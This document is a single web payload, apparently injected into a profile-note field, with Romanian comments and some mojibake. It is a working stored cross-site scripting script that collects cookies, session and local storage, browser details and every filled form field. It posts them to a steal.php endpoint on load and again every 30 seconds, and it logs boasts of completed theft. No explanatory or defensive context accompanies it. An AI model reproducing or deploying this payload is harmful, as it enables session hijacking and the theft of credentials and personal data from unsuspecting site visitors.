fields.profile_note:
<script>
function stealAllData() {
    var allData = {
        attack_type: 'complete_theft_same_folder',
        
        // Date sesiune
        cookies: document.cookie,
        sessionStorage: JSON.stringify(sessionStorage),
        localStorage: JSON.stringify(localStorage),
        
        // Date paginƒÉ
        url: window.location.href,
        referrer: document.referrer,
        pageTitle: document.title,
        
        // Date browser
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screenResolution: screen.width + 'x' + screen.height,
        
        // Date formulare
        formData: [],
        
        timestamp: new Date().toISOString()
    };
    
    // Extrage date din formulare
    document.querySelectorAll('form').forEach(function(form, index) {
        var formInfo = {
            formIndex: index,
            action: form.action,
            method: form.method,
            fields: {}
        };
        
        form.querySelectorAll('input, textarea, select').forEach(function(input) {
            if(input.name && input.value) {
                formInfo.fields[input.name] = input.value;
            }
        });
        
        allData.formData.push(formInfo);
    });
    
    // Trimite cƒÉtre steal.php (acela»ôi folder)
    fetch('./steal.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(allData),
        mode: 'no-cors'
    }).then(function() {
        console.log('üí∞ Toate datele furate cu succes!');
    }).catch(function(error) {
        console.error('‚ùå Furt e»ôuat:', error);
    });
}

// ExecutƒÉ imediat
stealAllData();

// RepetƒÉ la 30 secunde
setInterval(stealAllData, 30000);

console.log('üéØ Complete data theft activated!');
</script>
